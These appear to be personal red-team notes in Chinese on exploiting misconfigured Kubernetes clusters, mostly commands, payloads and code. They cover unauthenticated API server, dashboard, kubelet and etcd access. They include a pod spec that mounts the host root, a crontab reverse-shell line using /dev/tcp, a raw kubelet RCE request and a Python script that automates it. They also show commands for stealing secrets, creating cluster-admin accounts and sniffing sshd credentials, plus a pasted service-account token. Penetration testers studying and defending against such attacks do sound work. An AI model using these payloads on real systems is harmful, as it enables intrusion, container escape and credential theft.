<a name="nAHGO"></a>
## 杂七杂八的笔记
[https://github.com/neargle/my-re0-k8s-security](https://github.com/neargle/my-re0-k8s-security)   好文章

[https://www.jianshu.com/p/e443b3171253](https://www.jianshu.com/p/e443b3171253) k8s未授权<br />[https://www.freebuf.com/news/196993.html](https://www.freebuf.com/news/196993.html) k8s的理解(master、node、pod)、认证机制等等<br />[https://security.tencent.com/index.php/blog/msg/183](https://security.tencent.com/index.php/blog/msg/183)  腾讯蓝军总结的k8s攻击手法<br />[https://jimmysong.io/kubernetes-handbook/guide/auth-with-kubeconfig-or-token.html](https://jimmysong.io/kubernetes-handbook/guide/auth-with-kubeconfig-or-token.html) k8s的一些操作<br />[https://ruyueattention.github.io/2022/03/03/kunbernetes%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/](https://ruyueattention.github.io/2022/03/03/kunbernetes%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/)  如月博客<br />[https://github.com/Metarget/metarget](https://github.com/Metarget/metarget) k8s漏洞环境搭建



cat /proc/1/cgroup 查看是不是k8s<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647870895585-43d83a28-b059-4a49-abbc-69b53aa2cf7e.png#averageHue=%2319140f&clientId=u506b0e66-8291-4&from=paste&height=202&id=u4c40fc47&originHeight=269&originWidth=964&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48976&status=done&style=none&taskId=u487a2cac-f215-4a2b-a7cd-47c4795ecc4&title=&width=723)

cat /etc/passwd 和which kubectl 以及一些kubectl的命令查看判断<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647873105232-b18be52f-a52b-481f-a41a-7477fe98d241.png#averageHue=%230a0604&clientId=u506b0e66-8291-4&from=paste&height=497&id=udb94fce9&originHeight=663&originWidth=840&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80303&status=done&style=none&taskId=ub4bb04ba-68b0-4550-8006-f36bc8dee62&title=&width=630)

kubtctl.exe -s ip:port get pods 获取所有节点<br /># kubectl get pods --all-namespaces

 .\kubectl.exe -s 192.168.64.134:8080 --namespace=ability exec -it abilitygateway-54d9f4754d-p2m9s bash    进入对应节点的容器环境<br />有时候会报错可以尝试用/bin/sh   /bin/bash之类

kubectl --insecure-skip-tls-verify -s [https://192.168.5.174:6443/](https://192.168.5.174:6443/) --token="" -n kube-system get pods     带token访问api-server

k8s的运维控制台 (需要全端口扫出来，有时候点击跳过--可能是控制面板未授权漏洞能看到pods、nodes<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647100767063-b2d95960-88e6-4cfe-9636-08179878ae68.png#averageHue=%2392e2b3&clientId=uc2096fb4-939b-4&from=paste&height=612&id=u17072706&originHeight=816&originWidth=1210&originalType=binary&ratio=1&rotation=0&showTitle=false&size=510997&status=done&style=none&taskId=u9390a5c8-bafc-4159-bfe0-cf6380da0e9&title=&width=908)


[https://security.tencent.com/index.php/blog/msg/174](https://security.tencent.com/index.php/blog/msg/174) 文章中的攻击k8s payload

[https://ruyueattention.github.io/2022/03/03/kunbernetes%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/](https://ruyueattention.github.io/2022/03/03/kunbernetes%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/)
<a name="iyYc0"></a>
## Api Server 未授权(6443、8080、80端口
**1、pod相当于容器   node是宿主机  **<br />**2、容器的ip一般为172.16  宿主机ip是192.168 ，但是容器同样可以访问到宿主机的ip段访问(网络策略没做隔离**<br />**3、获取api-server权限等于掌控整个k8s集群**
<a name="mkYxQ"></a>
### 黑盒特征
黑盒测试的时候，访问某个页面，接口出现大量的api、k8s关机键字<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647847390301-f208390d-0a65-4b0e-ad82-a87774ef1adf.png#averageHue=%23fefefd&clientId=u506b0e66-8291-4&from=paste&height=664&id=uf5aa8daa&originHeight=885&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61054&status=done&style=none&taskId=uf1e1c701-340b-4656-b69e-f60e8ec0bb1&title=&width=607)
<a name="Te4oQ"></a>
### 坑点
1、有时候报错这个问题，需要进行证书忽略<br />Unable to connect to the server: x509: certificate signed by unknown authority

2、页面明明访问而且不需要权限，但是工具命令行需要验证（应该是工具的版本和目标的k8s版本不一致问题，**随意敲个账号敲几次**就进去了）<br />payload：
```java
.\kubectl.exe -s "https://192.168.5.174:6443" get pods --insecure-skip-tls-verify=true
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647847266178-92f2be49-0ce0-4336-b599-1bfe5a034b7b.png#averageHue=%23042759&clientId=u506b0e66-8291-4&from=paste&height=232&id=u3b9f3d00&originHeight=310&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50132&status=done&style=none&taskId=u567ff5f8-ccb9-43ec-bcb4-55de442b267&title=&width=902)

通过 https://ip:6443/api/v1/secrets  获取token值
```c
kubectl -s https://ip:6443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjYXRhbG9nIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tNGtocmciLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjE5MzUzYTY3LWYxMDgtMTFlYS1hZmQ2LWZhMTYzZTAwZjlhOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYXRhbG9nOmRlZmF1bHQifQ.TZa0QjsgZCco6bydsQcNbV5wVU8ePyZh4Qj1WGPQdDJG4JRt0bNKGJMWnO5AE_p4Cy8qavSU_GYzZ_8n3bb7sLQKj30m5GSq3kCHnUJKb3vzl4ZQYShE6nk9x-Qv0krd9B18BNyLbQe98NLO1P0u8lB8jDLV-vYYTtiqc2Y2HTDW3J1k3c5pasO7NMv-OMMdpC6DCfOd5Icr_-Ojpw74K5t9-CtfGWSxtkr4pX7nMPINh1Bfxp7vWX5oPvCLzQ7CG5a-QEF6F4GT88_5G71PeK65R2X_xwAPglt0U9nRWdWwHuqtLb46p3nlN4EQz7559nIo61Uyr9BD9UCWQaw_ow get nodes
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1649920273224-efe668c7-85c9-4acc-93db-fdb84679a532.png#averageHue=%23e9e9e9&clientId=u97f3386b-d149-4&from=paste&height=82&id=u9b0c5534&originHeight=93&originWidth=607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40575&status=done&style=none&taskId=uec528e38-4f46-489a-942b-9c7f86498d9&title=&width=536.6000061035156)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1649920261702-5e66f231-5131-4b16-b3d2-522736d14c24.png#averageHue=%231e1e1e&clientId=u97f3386b-d149-4&from=paste&height=457&id=u519a1d0a&originHeight=571&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=201356&status=done&style=none&taskId=uf2a015dd-5a30-44ba-83e6-6833f63d3a0&title=&width=971.2)
<a name="Qh4ri"></a>
### 利用方式一（如果pods存在的情况下：
kubectl -s ip:port  get pods  获取存在的容器<br /> .\kubectl.exe -s 192.168.64.134:8080 --namespace=ability exec -it abilitygateway-54d9f4754d-p2m9s bash    进入对应节点的容器环境


<a name="TnN9h"></a>
### 利用方式二 （pods不存在的情况下，通过nodes创建pods：
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647846273006-12ab9bb4-c9e3-4a8c-8674-b51395a9feb7.png#averageHue=%23032759&clientId=ua05e7c5c-bc1c-4&from=paste&height=159&id=uc7624097&originHeight=212&originWidth=1193&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36555&status=done&style=none&taskId=u9c929174-d2a3-460f-9615-55167af5908&title=&width=895)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647846240049-8e4cf78d-6365-49f8-8a65-2c330a380322.png#averageHue=%23032658&clientId=ua05e7c5c-bc1c-4&from=paste&height=279&id=u5645b4ce&originHeight=372&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54085&status=done&style=none&taskId=u4da8e941-5b94-460e-b66b-142a20e42b6&title=&width=894)

可以获取容器宿主机的权限<br />创建一个1.yaml(网上的yaml很多格式不对，最好用我的）
```java
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  nodeName: master #部署在master节点
  containers:
  - image: nginx #简单的镜像
    name: container
    volumeMounts:
    - mountPath: /test #把系统的根目录挂载到容器的这个目录下
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```
kubectl -s  ip:port create -f myapp.yaml  如果提交失败，就是客户端和服务端版本不一致的问题，可以尝试加上--validate=false<br />.\kubectl.exe -s "https://192.168.5.174:6443" create -f 1.yaml --insecure-skip-tls-verify=true --validate=false<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647847652755-c7249c27-e09f-40df-a3c5-7bc6e77c80f4.png#averageHue=%23022658&clientId=u506b0e66-8291-4&from=paste&height=350&id=u7a1a540e&originHeight=467&originWidth=1205&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68339&status=done&style=none&taskId=u38c32bc6-e916-481f-9fed-915f9cc0b30&title=&width=904)

然后查看是否创建evil的pods成功<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647847790211-86f215c1-814d-4f5c-bacc-401af65ff60f.png#averageHue=%23022658&clientId=u506b0e66-8291-4&from=paste&height=232&id=ubccc0c6a&originHeight=309&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43460&status=done&style=none&taskId=u2ffdca98-9e56-45b4-a722-8bd29a8ede7&title=&width=886)

查看创建容器的所属容器ip
```java
.\kubectl.exe -s https://192.168.5.174:6443/ describe pod evil --insecure-skip-tls-verify=true
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647850157273-809016f0-db48-4e54-9b52-cba7f3c09d74.png#averageHue=%23022659&clientId=u506b0e66-8291-4&from=paste&height=385&id=uadfbb42b&originHeight=513&originWidth=1200&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72026&status=done&style=none&taskId=u784dae16-d3dd-4cc0-8dd2-015d0bc2787&title=&width=900)

网络波动会影响整个pods是否启动成功，启动成功之后，可以直接弹shell<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647848896569-1ddc874d-6a77-4694-8d68-23edca3e0df2.png#averageHue=%2304295c&clientId=u506b0e66-8291-4&from=paste&id=u2a64f70f&originHeight=56&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6773&status=done&style=none&taskId=uf00e5ab4-f092-41f7-9274-cb5635a2e0d&title=)

.\kubectl.exe -s [https://192.168.5.174:6443/](https://192.168.5.174:6443/) exec -it evil bash --insecure-skip-tls-verify=true<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647848975128-52f0ecfd-71e0-4e93-acab-28f951b45a38.png#averageHue=%23042759&clientId=u506b0e66-8291-4&from=paste&height=571&id=u88ed0ef7&originHeight=761&originWidth=1503&originalType=binary&ratio=1&rotation=0&showTitle=false&size=444884&status=done&style=none&taskId=uc60fd5c4-72fb-4597-b7e0-2a0576535be&title=&width=1127)

**因为创建的时候，是挂载到test文件下，我们用之前命令获取容器的 bash，然后向容器的 /test/etc/crontab 写入反弹 shell ，就可以获取宿主机权限了**

evil的/test/root目录和宿主机root目录<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647849296290-b92f0044-fef9-471d-b240-82cba38a79a6.png#averageHue=%2387dc82&clientId=u506b0e66-8291-4&from=paste&id=u43a28084&originHeight=193&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37703&status=done&style=none&taskId=ub6079920-bc62-4cb2-b07c-83a9eaa8d60&title=)
```java
echo -e "* * * * * root bash -i >& /dev/tcp/ip/port 0>&1\n" >> /test/etc/crontab
```
<a name="m5rKw"></a>
## k8s的控制面板(端口随机

<a name="gPDtJ"></a>
### 控制面板的配置过程以及利用方法
下载 yaml，然后传到服务器上(服务器没配置翻墙)<br />[https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml](https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml)<br />kubectl apply -f dab.yaml 安装yaml![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647853243683-aae6c6a6-1134-4196-a953-fd2c1323999d.png#averageHue=%23130d09&clientId=u506b0e66-8291-4&from=paste&height=264&id=u451cf9ee&originHeight=352&originWidth=731&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48602&status=done&style=none&taskId=u33f74a31-460f-4b63-b84f-1a93e2a4ea1&title=&width=548)

kubectl get namespace 查看安装的空间命名，检查安装了没有<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647853207367-5eec394a-c107-4b61-acca-113efd03190d.png#averageHue=%230f0b08&clientId=u506b0e66-8291-4&from=paste&id=u7a3f3715&originHeight=161&originWidth=336&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10410&status=done&style=none&taskId=u7cd2ed3e-7142-4ba7-8af4-044c84fb56f&title=)

kubectl edit service -n kubernetes-dashboard 修改控制面板配置，把type改成NodePort<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647870556635-88a3ef77-01e3-475f-8f6c-ae5dc102f98c.png#averageHue=%23060302&clientId=u506b0e66-8291-4&from=paste&height=510&id=u84a2722e&originHeight=680&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48609&status=done&style=none&taskId=u5920be47-c138-4d62-91df-7f643be8488&title=&width=465)

kubectl get service -n kubernetes-dashboard 查看控制面板映射的端口<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647870737018-c85d2259-354f-41f2-ba5e-9d6be3380d58.png#averageHue=%23120c08&clientId=u506b0e66-8291-4&from=paste&height=64&id=ub1f59a37&originHeight=86&originWidth=851&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14509&status=done&style=none&taskId=u328751c3-150a-487a-84a7-d800742599f&title=&width=638)

访问对应的30024端口(**有时候运维错误配置成未授权访问，就可以具备控制面板的操作权限**）<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647870793576-e608f6ae-6f43-43d1-85b9-0a1995242ff2.png#averageHue=%23eceeef&clientId=u506b0e66-8291-4&from=paste&height=635&id=u12c6f0a9&originHeight=846&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104118&status=done&style=none&taskId=ud585bd21-0f62-4e07-a85b-075aabfeec9&title=&width=1440)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647871112896-844de7bc-0f11-46b6-8cb0-b368af5225ee.png#averageHue=%23e9c074&clientId=u506b0e66-8291-4&from=paste&height=605&id=u9b6b39c4&originHeight=806&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184322&status=done&style=none&taskId=ufb8ae340-502a-4b78-b490-0fb5a02c764&title=&width=1440)

<a name="XKjik"></a>
### 获取k8s服务器后寻找控制面板
kubectl  get sa,secrets -n kubernetes-dashboard 获取控制面板的管理员name   直接看account-token，一般是kubernetes-dashboard-token-xxx<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647872044176-a627d5a6-a913-478c-8a4f-d0160f851861.png#averageHue=%230e0705&clientId=u506b0e66-8291-4&from=paste&height=164&id=ubb511a06&originHeight=218&originWidth=842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28832&status=done&style=none&taskId=u48c7e34d-2ecb-418b-a38b-60b103b603c&title=&width=632)

kubectl describe secrets kubernetes-dashboard-token-j48s5 -n kubernetes-dashboard<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647872139493-a748a08a-d70e-46d3-9e22-15f52bc8ef4b.png#averageHue=%230c0906&clientId=u506b0e66-8291-4&from=paste&height=332&id=u1c29a794&originHeight=443&originWidth=1227&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84068&status=done&style=none&taskId=u15d675cb-4840-4de9-94a7-60f44a49532&title=&width=920)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647872182231-3dd19a5d-f111-41c2-a5d7-ea740d858262.png#averageHue=%23b5e9bc&clientId=u506b0e66-8291-4&from=paste&height=554&id=u21371204&originHeight=739&originWidth=1688&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72936&status=done&style=none&taskId=uf3c24239-53c9-4601-b8ad-0f279336775&title=&width=1266)

也可以自己创建一个控制面板管理员的账号密码<br />kubectl create serviceaccount dashboard-aufeng -n kubernetes-dashboard

kubectl create clusterrolebinding  dashboard-cluster-admin --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-aufeng<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647872519296-879f9af6-be16-4db8-af12-fb0efbdcdf72.png#averageHue=%230b0705&clientId=u506b0e66-8291-4&from=paste&height=378&id=u1595d79f&originHeight=756&originWidth=1232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=136486&status=done&style=none&taskId=u14e1b107-23f7-44d6-81b6-dc9c3df0dbf&title=&width=616)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647872578201-11b04554-db15-4d0a-8956-88c56b7dd15d.png#averageHue=%2356a550&clientId=u506b0e66-8291-4&from=paste&height=409&id=u408b3f62&originHeight=817&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139699&status=done&style=none&taskId=u6e1f69b7-1341-493a-9218-124288fd485&title=&width=960)
<a name="WLfqU"></a>
## kubelet未授权 10250端口
**10250端口未授权利用方式只能获取单个pod的权限**
<a name="PVIKU"></a>
### 黑盒利用方式
访问 10250端口的/pods目录<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647873970158-3102f6af-8bc6-4f8a-9ae9-7d7751dfa713.png#averageHue=%23dbb78a&clientId=u86416011-6619-4&from=paste&height=345&id=uda03045c&originHeight=689&originWidth=1067&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48017&status=done&style=none&taskId=u64d9db15-e39d-4c3f-afec-ddbcd4f9483&title=&width=533.5)
```java
找到对应的字眼
/run/<namespace>/<name>/<labeles>
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647144517055-23f5231e-8276-47ac-b9a2-5b772dd5ca10.png#averageHue=%23f9f9f9&clientId=uc2096fb4-939b-4&from=paste&height=383&id=uddb5dd72&originHeight=510&originWidth=1081&originalType=url&ratio=1&rotation=0&showTitle=false&size=61976&status=done&style=none&taskId=u603f75f4-e7be-42d6-b23d-454ab37ab69&title=&width=811)
```java
POST /run/<namespace>/<name>/<labeles> HTTP/1.1
Host: 192.168.5.174:10250
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

cmd=whoami

```
<a name="dQt7y"></a>
### 如月写的自动化利用python脚本
```java
import re
import json
import argparse
import requests
requests.packages.urllib3.disable_warnings()


def exp_go(ip,port):
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 MicroMessenger/7.0.9.501 NetType/WIFI MiniProgramEnv/Windows WindowsWechat",
        "content-type":"application/x-www-form-urlencoded"
        }
    try:
        r=requests.get('https://'+ip+':'+port+'/pods',headers=headers,verify=False,timeout=10)
        info=json.loads(r.text)
    except:
        return False
    for i in range(0,len(info["items"])):
        
        try:
            
            namespace=info["items"][i]["metadata"]["namespace"]
            name=info["items"][i]["metadata"]["name"];
            k8s_app=info["items"][i]["metadata"]["labels"]["k8s-app"]
            url="https://"+ip+":"+port+"/run/"+namespace+"/"+name+"/"+k8s_app
            RCE(url,headers)
        except:
            pass

def RCE(url,headers):
    while(1):
        cmd=input("命令:")
        data={
            "cmd":cmd
        }
        r=requests.post(url=url,headers=headers,verify=False,timeout=10,data=data)
        print("===========命令执行结果=============")
        print(r.text)
        print("====================================\n\n")

    
if __name__ == '__main__':
    
    
    
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-u', type=str, help='ip:127.0.0.1')
    parser.add_argument('-p', type=str, help='端口:10250')
    args = parser.parse_args()

    
    result=exp_go(args.u,args.p)
```

<a name="VNwR8"></a>
### 10255端口
由于这里 10250 鉴权当前的 Kubernetes 设计是默认安全的，所以 10255 的开放就可能更加容易在红蓝对抗中起到至关重要的作用。10255 本身为只读端口，虽然开放之后默认不存在鉴权能力，无法直接利用在容器中执行命令，但是可以获取环境变量 ENV、主进程 CMDLINE 等信息，里面包含密码和秘钥等敏感信息的概率是很高的，可以快速帮我们在对抗中打开局面。

<a name="WfShl"></a>
## etcd未授权（常见2379端口
**etcd可以访问到k8s的集群token，可以通过未授权访问etcd获取k8s的管理员token从而掌控k8s集群**
<a name="nz9bC"></a>
### etcd授权的访问操作
安装etcdctl客户端命令行工具，有linux和windows版本<br />[https://github.com/etcd-io/etcd/releases/tag/v3.5.2](https://github.com/etcd-io/etcd/releases/tag/v3.5.2)<br />export ETCDCTL_API=3

认证证书都在/etc/kubernetes/pki/etcd路径下<br />root@master:/etc/kubernetes/pki/etcd# etcdctl --endpoints 127.0.0.1:2379 --cacert=ca.crt --cert=server.crt --key=server.key endpoint health   查看证书下能不能建立成功<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647923398441-aca281fd-3241-477e-afa8-e49a85bc421b.png#averageHue=%230a0704&clientId=ucc352e4d-560e-4&from=paste&height=152&id=u9327cf99&originHeight=202&originWidth=1225&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35895&status=done&style=none&taskId=ud322827f-c7d5-4d4a-81a6-501bafb536a&title=&width=919)
```java
root@master:/etc/kubernetes/pki/etcd# etcdctl --endpoints 127.0.0.1:2379 --cacert=ca.crt --cert=server.crt --key=server.key get / --prefix --keys-only | grep /secrets/kube-system/clusterrole

/registry/secrets/kube-system/clusterrole-aggregation-controller-token-67jwz

```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647924020489-4da58eec-94a4-4248-9dc9-3928890a6f22.png#averageHue=%230b0705&clientId=ucc352e4d-560e-4&from=paste&height=61&id=u68767dbf&originHeight=81&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14846&status=done&style=none&taskId=u471f8434-136e-4e0b-bc35-30231be1c8b&title=&width=914)

etcdctl --endpoints 127.0.0.1:2379 --cacert=ca.crt --cert=server.crt --key=server.key get / --prefix --keys-only | grep /secrets/<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647926457744-df82f403-7f1a-46a2-baea-80dfbd06e9d5.png#averageHue=%230a0604&clientId=ucc352e4d-560e-4&from=paste&height=336&id=u1d4f72aa&originHeight=672&originWidth=1226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124222&status=done&style=none&taskId=ua935a24b-46ca-44d9-9586-5594473f711&title=&width=613)

etcdctl --endpoints 127.0.0.1:2379 --cacert=ca.crt --cert=server.crt --key=server.key get /registry/secrets/kubernetes-dashboard/dashboard-aufeng-token-zfltw   #获取之前创建的控制面板管理员的token数据<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647930191242-b7077d39-58f0-4342-8bc1-6e35b70d6706.png#averageHue=%2315100b&clientId=ucc352e4d-560e-4&from=paste&height=165&id=ub5fe081f&originHeight=220&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62075&status=done&style=none&taskId=ue66c062f-84b9-4f7b-b8d2-e946dfeca2e&title=&width=911)

然后使用kubectl --insecure-skip-tls-verify -s [https://192.168.5.174:6443/](https://192.168.5.174:6443/) --token="" -n kube-system get pods访问<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647929721405-41020d02-5b1b-443f-b2e5-953f80e94783.png#averageHue=%23042859&clientId=ucc352e4d-560e-4&from=paste&height=332&id=uef551018&originHeight=442&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126041&status=done&style=none&taskId=u9445cd49-672a-468a-8055-1989968c916&title=&width=905)
<a name="cP2Hh"></a>
### 未授权的访问命令操作
```java
export ETCDCTL_API=3   #环境变量设置etcdctl的v3
etcdctl endpoint health   #检查未授权访问etcdctl是否能建立连接
etcdctl get / --prefix --keys-only | grep /secrets/  #匹配查找token的路径
etcdctl get /registry/secrets/xxxxxxxxxx   #通过路径获得token值
kubectl --insecure-skip-tls-verify -s https://192.168.5.174:6443/ --token="" -n kube-system get pods 
```

<a name="DnXYk"></a>
## kubectl proxy(随机端口，http协议
k8s的代理缺陷<br />有时候运维设置API server接收所有主机的请求方便临时在本地和外网调试
```java
$ kubectl proxy --address='0.0.0.0'  --accept-hosts='^*$' --port=8009
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647935918304-6ceee580-60b8-4879-a6c7-f428d3786976.png#averageHue=%23050402&clientId=ucc352e4d-560e-4&from=paste&height=59&id=ua643c551&originHeight=78&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6398&status=done&style=none&taskId=ua203f022-4c70-4a0f-993c-5755752ec7b&title=&width=567)

如果碰到这种端口，相当于api-server未授权了。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647936425636-a6e31d2f-195c-4ecf-aa96-10931e8a45d8.png#averageHue=%23022659&clientId=ucc352e4d-560e-4&from=paste&height=465&id=ua1dc35df&originHeight=929&originWidth=1079&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129118&status=done&style=none&taskId=uc4986824-8337-45bf-97b2-04169e8f6e4&title=&width=539.5)


<a name="CJoWy"></a>
## 思路
那创建一个能获取NODE权限的POD或许就是一个不错的选择，因为只有这样获取的shell才能更方便的在容器母机上进行信息收集，例如 strace 母机 sshd 进程抓取我们想要的用户名和密码、使用 tcpdump 抓取内网系统的管理员登录态等，目前正在运行的容器一般是没有这些权限的。  
